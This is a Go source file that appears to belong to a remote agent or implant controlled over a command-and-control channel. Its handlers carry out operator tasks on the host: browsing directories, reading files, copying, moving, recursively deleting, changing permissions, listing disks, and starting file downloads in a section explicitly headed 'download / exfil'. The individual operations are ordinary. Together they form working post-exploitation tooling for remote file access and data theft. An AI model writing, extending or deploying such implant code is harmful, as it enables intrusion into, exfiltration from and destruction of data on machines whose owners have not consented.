package main

import (
	"io"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
)

func osGeteuid() int { return os.Geteuid() }

// ---------------------------------------------------------------------------
// pwd / cd
// ---------------------------------------------------------------------------

func (a *agent) cmdPwd(r *reader) {
	taskID := r.u32()
	cwd, err := os.Getwd()
	if err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdPwd, func(w *writer) { w.str(cwd) })
}

func (a *agent) cmdCd(r *reader) {
	path := r.str()
	taskID := r.u32()

	if path == "" {
		path = "/"
	}
	if err := os.Chdir(path); err != nil {
		a.replyErr(taskID, err)
		return
	}
	cwd, err := os.Getwd()
	if err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdCd, func(w *writer) { w.str(cwd) })
}

// ---------------------------------------------------------------------------
// cat
// ---------------------------------------------------------------------------

func (a *agent) cmdCat(r *reader) {
	path := r.str()
	taskID := r.u32()

	f, err := os.Open(path)
	if err != nil {
		a.replyErr(taskID, err)
		return
	}
	defer f.Close()

	buf := make([]byte, 2048)
	n, err := f.Read(buf)
	if err != nil && err != io.EOF {
		a.replyErr(taskID, err)
		return
	}
	content := buf[:n]
	a.reply(taskID, cmdCat, func(w *writer) {
		w.str(path)
		w.bytes(content)
	})
}

// ---------------------------------------------------------------------------
// ls
// ---------------------------------------------------------------------------

type fileEntry struct {
	name  string
	isDir bool
	size  int64
	mtime int64
	mode  uint32
	uid   uint32
	gid   uint32
}

func (a *agent) cmdLs(r *reader) {
	path := r.str()
	taskID := r.u32()

	if path == "" {
		path = "."
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		abs = path
	}

	info, err := os.Stat(abs)
	if err != nil {
		a.reply(taskID, cmdLs, func(w *writer) {
			w.u8(0)
			w.u32(uint32(errnoOf(err)))
		})
		return
	}

	var entries []fileEntry
	rootPath := abs

	if info.IsDir() {
		names, err := os.ReadDir(abs)
		if err != nil {
			a.reply(taskID, cmdLs, func(w *writer) {
				w.u8(0)
				w.u32(uint32(errnoOf(err)))
			})
			return
		}
		for _, de := range names {
			fi, err := de.Info()
			if err != nil {
				continue
			}
			entries = append(entries, makeFileEntry(abs, fi))
		}
	} else {
		entries = append(entries, makeFileEntry(filepath.Dir(abs), info))
		rootPath = filepath.Dir(abs)
	}

	sort.Slice(entries, func(i, j int) bool {
		if entries[i].isDir != entries[j].isDir {
			return entries[i].isDir
		}
		return strings.ToLower(entries[i].name) < strings.ToLower(entries[j].name)
	})

	a.reply(taskID, cmdLs, func(w *writer) {
		w.u8(1)
		w.str(rootPath)
		w.u32(uint32(len(entries)))
		for _, e := range entries {
			w.u8(boolByte(e.isDir))
			w.u64(uint64(e.size))
			w.u32(uint32(e.mtime))
			w.u32(e.mode)
			w.str(userNameByUID(int(e.uid)))
			w.str(groupNameByGID(int(e.gid)))
			w.str(e.name)
		}
	})
}

func makeFileEntry(dir string, fi os.FileInfo) fileEntry {
	e := fileEntry{
		name:  fi.Name(),
		isDir: fi.IsDir(),
		size:  fi.Size(),
		mtime: fi.ModTime().Unix(),
		mode:  uint32(fi.Mode()),
	}
	if st, ok := fi.Sys().(*syscall.Stat_t); ok {
		e.uid = st.Uid
		e.gid = st.Gid
	}
	return e
}

// ---------------------------------------------------------------------------
// cp / mv / mkdir / rm / chmod
// ---------------------------------------------------------------------------

func (a *agent) cmdCopy(r *reader) {
	src := r.str()
	dst := r.str()
	taskID := r.u32()

	if err := copyFile(src, dst); err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdCopy, nil)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	st, err := in.Stat()
	if err != nil {
		return err
	}
	if st.IsDir() {
		return syscall.EISDIR
	}

	target := dst
	if fi, err := os.Stat(dst); err == nil && fi.IsDir() {
		target = filepath.Join(dst, filepath.Base(src))
	}

	out, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, st.Mode().Perm())
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		_ = out.Close()
		return err
	}
	return out.Close()
}

func (a *agent) cmdMv(r *reader) {
	src := r.str()
	dst := r.str()
	taskID := r.u32()

	target := dst
	if fi, err := os.Stat(dst); err == nil && fi.IsDir() {
		target = filepath.Join(dst, filepath.Base(src))
	}

	if err := os.Rename(src, target); err != nil {
		// EXDEV: cross-device move, fall back to copy + unlink.
		if errnoOf(err) == int(syscall.EXDEV) {
			if cerr := copyFile(src, target); cerr != nil {
				a.replyErr(taskID, cerr)
				return
			}
			if rerr := os.Remove(src); rerr != nil {
				a.replyErr(taskID, rerr)
				return
			}
		} else {
			a.replyErr(taskID, err)
			return
		}
	}
	a.reply(taskID, cmdMv, nil)
}

func (a *agent) cmdMkdir(r *reader) {
	path := r.str()
	taskID := r.u32()

	if err := os.MkdirAll(path, 0755); err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdMkdir, func(w *writer) { w.bytes([]byte(path)) })
}

func (a *agent) cmdRm(r *reader) {
	path := r.str()
	taskID := r.u32()

	fi, err := os.Lstat(path)
	if err != nil {
		a.replyErr(taskID, err)
		return
	}

	isDir := fi.IsDir()
	if isDir {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	if err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdRm, func(w *writer) { w.u8(boolByte(isDir)) })
}

func (a *agent) cmdChmod(r *reader) {
	path := r.str()
	mode := r.u32()
	taskID := r.u32()

	if err := os.Chmod(path, os.FileMode(mode&07777)); err != nil {
		a.replyErr(taskID, err)
		return
	}
	a.reply(taskID, cmdChmod, func(w *writer) {
		w.str(path)
		w.u32(mode & 07777)
	})
}

// ---------------------------------------------------------------------------
// disks
// ---------------------------------------------------------------------------

type mountEntry struct {
	device string
	mount  string
	fstype string
	total  uint64
	free   uint64
}

var pseudoFilesystems = map[string]bool{
	"proc": true, "sysfs": true, "devpts": true, "devtmpfs": true,
	"cgroup": true, "cgroup2": true, "securityfs": true, "debugfs": true,
	"tracefs": true, "configfs": true, "fusectl": true, "mqueue": true,
	"hugetlbfs": true, "bpf": true, "pstore": true, "autofs": true,
	"binfmt_misc": true, "rpc_pipefs": true, "nsfs": true, "fuse.gvfsd-fuse": true,
}

func listMounts() []mountEntry {
	data, err := os.ReadFile("/proc/mounts")
	if err != nil {
		return nil
	}
	var out []mountEntry
	seen := make(map[string]bool)

	for _, line := range strings.Split(string(data), "\n") {
		f := strings.Fields(line)
		if len(f) < 3 {
			continue
		}
		dev := unescapeMount(f[0])
		mount := unescapeMount(f[1])
		fstype := f[2]
		if pseudoFilesystems[fstype] {
			continue
		}
		if seen[mount] {
			continue
		}
		seen[mount] = true

		var st syscall.Statfs_t
		if err := syscall.Statfs(mount, &st); err != nil {
			continue
		}
		bsize := uint64(st.Bsize)
		out = append(out, mountEntry{
			device: dev,
			mount:  mount,
			fstype: fstype,
			total:  st.Blocks * bsize,
			free:   st.Bavail * bsize,
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].mount < out[j].mount })
	return out
}

func (a *agent) cmdDisks(r *reader) {
	taskID := r.u32()
	mounts := listMounts()

	if len(mounts) == 0 {
		a.reply(taskID, cmdDisks, func(w *writer) {
			w.u8(0)
			w.u32(uint32(syscall.ENOENT))
		})
		return
	}

	a.reply(taskID, cmdDisks, func(w *writer) {
		w.u8(1)
		w.u32(uint32(len(mounts)))
		for _, m := range mounts {
			w.str(m.mount)
			w.str(m.fstype)
			w.u64(m.total)
			w.u64(m.free)
		}
	})
}

// ---------------------------------------------------------------------------
// download / exfil
// ---------------------------------------------------------------------------

func (a *agent) cmdDownload(r *reader) {
	path := r.str()
	taskID := r.u32()

	if err := a.dl.start(a, taskID, path); err != nil {
		a.replyErr(taskID, err)
	}
}

func (a *agent) cmdDownloadState(r *reader) {
	state := uint8(r.u32())
	fileID := r.u32()
	taskID := r.u32()

	a.dl.setState(a, taskID, fileID, state)
}
